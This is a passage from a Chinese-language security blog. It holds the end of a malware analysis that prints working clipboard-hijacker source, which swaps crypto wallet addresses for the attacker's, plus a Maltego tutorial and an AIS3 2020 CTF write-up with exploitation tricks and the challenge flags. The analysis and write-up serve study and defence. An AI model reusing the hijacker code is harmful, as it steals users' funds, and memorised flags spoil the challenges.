class="keyword">try</span>:</span><br><span class="line">            o0OOO = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">                ooOo + Oo</span><br><span class="line">            o0OIiiIII111iI = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=IiII)</span><br><span class="line">            o0OOO = <span class="built_in">str</span>(o0OIiiIII111iI.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> o0OOO != iI1Ii11111iIi <span class="keyword">and</span> o0OOO != i1i1II:</span><br><span class="line">                <span class="keyword">if</span> re.match(O0oo0OO0, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(iI1Ii11111iIi)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(I1i1iiI1, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(i1i1II)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> iiIIIII1i1iI:</span><br><span class="line">            <span class="built_in">print</span>(iiIIIII1i1iI)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">            o00ooo0 / Oo00O0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == O0(<span class="string">u&#x27;\u0829\u0862\u0863\u0872\u0867\u0869\u086f\u0861\u0862\u082b\u0805&#x27;</span>):</span><br><span class="line">    i1i1II = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    iI1Ii11111iIi = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    O0oo0OO0 = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    I1i1iiI1 = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    IiII = subprocess.STARTUPINFO()</span><br><span class="line">    IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    I1IiI()</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        o0oooOoO0</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        IiIii1Ii1IIi / O0Oooo00.oo00 * I11</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I</span><br><span class="line"><span class="comment"># okay decompiling 8.61.py.pyc</span></span><br></pre></td></tr></table></figure>
<p>有稍微混淆過的原始碼，重新命名一下變數就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            clipboard = <span class="literal">None</span></span><br><span class="line">            process = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=startupinfo)</span><br><span class="line">            clipboard = <span class="built_in">str</span>(process.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> clipboard != btc_address <span class="keyword">and</span> clipboard != eth_address:</span><br><span class="line">                <span class="keyword">if</span> re.match(btc_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(btc_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(eth_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(eth_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(err)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    eth_address = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    btc_address = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    btc_address_pattern = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    eth_address_pattern = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    startupinfo = subprocess.STARTUPINFO()</span><br><span class="line">    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>他把你剪貼簿裡面符合 bitcoin 或 ethereum 地址格式的通通換成他錢包的位址。</p>
<h2 id="IOC">IOC</h2>
<ul>
<li>0x22f338FC26Ea71EC884256C29103122c4578EE27</li>
<li>14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS</li>
</ul>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/08/16/clipboard-hijack/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-07-30T16:00:00.000Z" title="7/31/2020, 12:00:00 AM">2020-07-31</time></span><i class="material-icons">schedule</i><span class="level-item">4 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/07/31/maltego/">【工具介紹】Maltego</a></h1><div class="content"><p>Maltego 是用來自動化情資蒐集的工具。</p>
<h2 id="基本介紹">基本介紹</h2>
<p>一開始就按 Creat a new graph 新增一個工作的圖層，就可以在上面畫出關係圖。<br>
Entities 是基本物件，有很多種類型比如 Company, Organization, Domain, Website, …，每個物件都有幾個屬性欄位，假設你拿到某個人的手機號碼，那可以從旁邊 Entity Palette 拖曳一個 Phone Number 到右邊空白處。<br>
Transforms 就是一個可以重複使用的函式，比如已經有了手機號碼，那就去某個網站上爬手機號碼對應的國家之類的，把這個爬的步驟寫成一個 transform，就可以自動化去從已知的資料生更多相關的資料。Local Transform 是自己寫的函式，也有別人寫好的在 Transform Hub 上面。</p>
<h2 id="Local-Transforms">Local Transforms</h2>
<p>跟著官方文件 <a target="_blank" rel="noopener" href="https://docs.maltego.com/support/solutions/articles/15000017605-local-transforms-example-">maltego docs</a> 做就可以大概了解怎麼用 python 去寫 Local Transforms 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install maltego-trx</span><br><span class="line">maltego-trx start new_project</span><br></pre></td></tr></table></figure>
<p>先安裝 python 套件，再用 <code>maltego-trx</code> 去初始化一個 project</p>
<figure class="highlight python"><figcaption><span>transforms/TaxIDToCompany.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> maltego_trx.entities <span class="keyword">import</span> Person</span><br><span class="line"><span class="keyword">from</span> maltego_trx.transform <span class="keyword">import</span> DiscoverableTransform</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaxIDToCompany</span>(<span class="title class_ inherited__">DiscoverableTransform</span>):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_entities</span>(<span class="params">cls, request, response</span>):</span><br><span class="line">        taxid = request.Properties[<span class="string">&#x27;properties.taxid&#x27;</span>]</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;http://company.g0v.ronny.tw/api/show/<span class="subst">&#123;taxid&#125;</span>&#x27;</span>)</span><br><span class="line">        result = json.loads(r.text)</span><br><span class="line">        response.addEntity(<span class="string">&#x27;maltego.Company&#x27;</span>, result[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;公司名稱&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>主要就是繼承 <code>DiscoverableTransform</code> 然後填寫 <code>create_entities</code> 這個函式，request 裡面就有執行 transform 的那個 entity 的資訊，然後這裡是用統一編號 ( TaxID ) 去找公司名稱，然後新增一個公司的 Entity。<br>
原本沒有 TaxID 這個 Entity 要先去 New Entity Type 新增一個 TaxID。<br>
<code>company.g0v.ronny.tw</code> 回傳的資訊有很多，可以把那些資訊都加進來，可是我就懶。</p>
<p>寫完之後要把 Local Transform 加進去，有幾個欄位要注意，</p>
<ol>
<li>Input entity type : 要填這個 transform 要對哪一種 entity 做操作</li>
<li>Command : 我們是用 python api 所以要填 python 的 PATH，在 linux 上可以用 <code>which python</code> 找</li>
<li>Parameters : 填 <code>project.py local TaxIDToCompany</code>，<code>project.py</code> 是初始化 project 完會產生的腳本，<code>local</code> 指的就是 Local Transform，<code>TaxIDToCompany</code> 是你 transform 的名字，就是那個檔名的部分吧</li>
<li>Working directory: Project 的路徑，就是要有 <code>project.py</code> 的那個地方</li>
</ol>
<p>最後按下 Run 跑完 transform 之後，就會自動新增一個 Company 的 Entity。</p>
<p align="center"><img data-src="/images/maltego-result.png" class=" lazyload"  title="maltego result"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/07/31/maltego/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-06-08T16:00:00.000Z" title="6/9/2020, 12:00:00 AM">2020-06-09</time></span><i class="material-icons">schedule</i><span class="level-item">39 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/06/09/ais3-2020-preexam/">【CTF Writeups】AIS3 pre-exam 2020</a></h1><div class="content"><p>這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。</p>
<p align="center"><img data-src="/images/ais3-scores.png" class=" lazyload"  title="AIS3 Pre-Exam Scores"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/OAlienO/CTF/tree/master/2020/AIS3-pre-exam">攻擊腳本們在這</a></p>
<h2 id="Misc">Misc</h2>
<h3 id="Piquero">Piquero</h3>
<p>這題給了一張點字的圖，只要先找到出題者用的 generator <a target="_blank" rel="noopener" href="https://www.mathsisfun.com/braille-translation.html">這個</a>，接著就一個一個對照就解出來了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Karuego">Karuego</h3>
<p>這題給了一張 png，先用 <code>binwalk --dd=&quot;.*&quot; Karuego.png</code> 拉出一個 zip 檔，這個 zip 檔有加密，原本想用 <code>fcrackzip</code> 之類的爆破工具，但 <code>zsteg -a Karuego.png</code> 下去發現 LSB 有一段文字 <code>The key is : lafire</code>，zip 檔解開裡面有一張 <code>Demon.png</code> 打開就看到 flag 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Soy">Soy</h3>
<p>這題給了一張 png，是被墨漬污染的 QR Code，我用 <code>https://merricx.github.io/qrazybox/</code> 把已知的黑點白點都畫了上去就解出來了，因為大部分的 Data 區塊都沒被污染到吧，這個網站上畫 QR Code 的時候記得要畫白點，不要只畫黑點，沒畫的會是未知的灰點，我在這裡卡很久Q</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Saburo">Saburo</h3>
<p>這題要 <code>nc 60.250.197.227 11001</code>，沒給原始碼，連上去要輸入 flag 給他，他會輸出你幾秒後輸了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 24 milliseconds.</span><br></pre></td></tr></table></figure>
<p>猜測是 Side Channel Attack，原始碼猜測大概是 ( 不負責任亂寫 code 如下 )</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare</span>(<span class="params">real_flag, user_flag</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(user_flag) <span class="keyword">if</span> <span class="built_in">len</span>(user_flag) &lt; <span class="built_in">len</span>(real_flag) <span class="keyword">else</span> <span class="built_in">len</span>(real_flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_flag)):</span><br><span class="line">        <span class="keyword">if</span> user_flag[i] != real_flag[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> i == <span class="built_in">len</span>(user_flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;AIS3&#123;...&#125;&#x27;</span></span><br><span class="line">user_flag = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">start = time.clock()</span><br><span class="line">win = compare(real_flag, user_flag)</span><br><span class="line">end = time.clock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> win:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Haha, you lose in <span class="subst">&#123;end - start&#125;</span> milliseconds.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Oh, you win. QQ&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是很多人在連線的時候去算 cpu time 會抖的很大力，所以後來 server 應該是改成用模擬的 ( 就比較穩了 )，就是錯了就加個 random 小 noise，對了就加一個大一點的值之類的。</p>
<p>所以每個字都爆搜 0 - 255，然後取最大的就好了，可以每次嘗試都送個十次取平均之類的，或是把 log 記起來，之後如果爆搜所有 byte 都沒有進展的話就，回去找第二高的，會比較穩。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shichirou">Shichirou</h3>
<p>這題要 <code>nc 60.250.197.227 11000</code>，有給原始碼，給他一個 tar 檔，他幫你解開然後把解開的 <code>guess.txt</code> 跟 local 的 <code>flag.txt</code> 的 sha1 做比較，如果一樣的話就噴 flag。<br>
tar 可以壓縮 symbolic link，自己做一個 symbolic link 指向 <code>flag.txt</code> 就完成了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s ../flag.txt guess.txt</span><br><span class="line">tar -cf test.tar ./</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Clara">Clara</h3>
<p>這題給了一個 pcap 檔，一開始啥提示都沒有，後來有說是 Malware 在 monitor 電腦然後傳 encrypted data 給 C&amp;C Server，然後傳了兩次一樣的資料，看了老半天，會發現 tcp 流量裡面有類似 AIS3 的字樣，有兩大包 tcp，一包 10 MB 另一包 27 MB，加密的話大概也只有 xor 比較正常吧，所以複製了一些部分用 <code>xortool</code> 分析，找到 key 是 <code>AIS3&#123;NO&#125;</code>，而且看到 PNG 開頭的字樣和一些 xml 的 meta data，就可以確定假設正確也解對了(汗，既然兩次包的明文是一樣的那就把兩包做 xor 再 xor 上 <code>AIS3&#123;NO&#125;</code> 就得到另一包的 key 是 <code>xSECRETx</code>，接著把整包拿去做 xor 拉出圖片，圖片有好幾 MB 很大，一開始只有拉出一張圖片，某個動漫的圖，又卡了一下後，發現那包前面的部分有類似 header 的東西，他不是 8 的倍數，我一開始是直接不理他，但是猜測後面也有好幾段 header，讓 xor 沒對齊壞掉，所以我就把整段 data 暴力 shift 了幾次拿去 xor，就拉出所有照片了，其中一張有 flag，其他都垃圾，原本不知道有很多張圖片，也不知道 flag 在哪的時候還在開 <code>stegsolve</code> 和 <code>zsteg</code> 在圖片找 flag，浪費很多時間。<br>
他的 packet 是很有秩序沒有亂傳的，header 裡面就是固定傳一個 <code>0xdeadbeeffaceb00c</code> 然後 C&amp;C 把剛剛那段 xor 加密回傳，接著後面檔案名字的大小，和檔案名字，每個都分開傳，每個都自己做 xor cipher，接著就是傳 data，都沒有走歪或是掉進什麼坑的話還是有機會解出來的，我也不常分析 packet 也沒分析過什麼惡意程式，經驗不足所以解很久還要看 hint QQ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reverse">Reverse</h2>
<h3 id="TsaiBro">TsaiBro</h3>
<p>這題給了一個 <code>ELF</code> 執行檔還有被加密的 flag 檔，被加密的 flag 檔的一小段大概長下面這樣</p>
<p><code>發財..發財.......發財....發財.......發財....發財.發財........</code></p>
<p>隨便用 ida 看了一下後，加密流程就是把 flag 轉乘 <code>flag // 8</code> 和 <code>flag % 8</code>，然後數字是多少就轉乘多少個點，所以最多 8 個點，上面那段就是 <code>[2, 7, 4, 7, 4, 1, 8]</code>，那解密就反過來組回去就好。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fallen-Beat">Fallen Beat</h3>
<p>這題給了一隻 jar 執行檔，跑起來是一個節奏遊戲，要 Full Combo 才能拿到 flag，那直接 <code>JD-GUI</code> 下去看他，關鍵在 <code>PanelEnding.class</code> 裡面，定義了被加密的 flag 陣列，還有後面做 xor 解回 flag 印出來的部分</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; </span><br><span class="line">    <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">    <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">    <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">    <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="built_in">this</span>.flag[i % <span class="built_in">this</span>.flag.length] = (<span class="type">byte</span>)(<span class="built_in">this</span>.flag[i % <span class="built_in">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue());</span><br><span class="line">    <span class="type">String</span> <span class="variable">fff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.flag);</span><br><span class="line">    <span class="built_in">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">&quot;Flag: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; fff &#125;));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>這裡的 cache 原本以為是內建的東東，結果不是，追了一下發現在 <code>GameControl.class</code> 有定義，東西是從 <code>songs/gekkou/hell.txt</code> 抓出來的，那就直接照著 xor 就解出來了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Stand-up-Brain">Stand up!Brain</h3>
<p>這題給了一個 <code>ELF</code> 執行檔，隨便看了一下發現他實做了 Brainfuck，然後程式碼在執行檔裡面，拉出來長這樣</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]]</span><br></pre></td></tr></table></figure>
<p>人腦跑了一下發現前面一段是在做很多 if 判斷，後面有 <code>.</code> 的部分是印 flag 的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># if (ptr[0] - 67) == 0</span><br><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">[</span><br><span class="line">    # if (ptr[2] - 56) == 0</span><br><span class="line">    &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">    [</span><br><span class="line">        # if (ptr[4] - 55) == 0</span><br><span class="line">        &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">        [</span><br><span class="line">            # if (ptr[6] - 54) == 0</span><br><span class="line">            &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">            [</span><br><span class="line">                # if (ptr[8] - 51) == 0</span><br><span class="line">                &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">                [</span><br><span class="line">                    # if (ptr[8] - 33) == 0</span><br><span class="line">                    &gt;---------------------------------[&gt;[-]&lt;[-]]&gt;</span><br></pre></td></tr></table></figure>
<p>所以只要你的輸入要是 <code>C8763!</code> 就會進到後面印 flag 的部分，所以可以直接執行原本的程式輸入 <code>C8763!</code> 跟桐人一起使出星爆氣流斬拿 flag，或是直接忽略前面把後面那段貼到線上的 Brainfuck Compiler 執行一下也可以拿到 flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Long-Island-Iced-Tea">Long Island Iced Tea</h3>
<p>這題給了一個 <code>ELF</code> 執行檔還有被加密的 flag 檔，被加密的 flag 長這樣</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000</span><br></pre></td></tr></table></figure>
<p>隨便嘗試了一下發現超過 8 個 bytes 之後的都不會變而且直接是明文了，把上面那段從 hex 轉回 bytes 就變成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x85\n*M?\xac\x14\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\x00\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>
<p>前面 8 個 bytes 已知 <code>AIS3&#123;</code> 5 個字了，所以直接爆搜剩下 3 個字。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;</span><br></pre></td></tr></table></figure>
<h3 id="La-vie-en-rose">La vie en rose</h3>
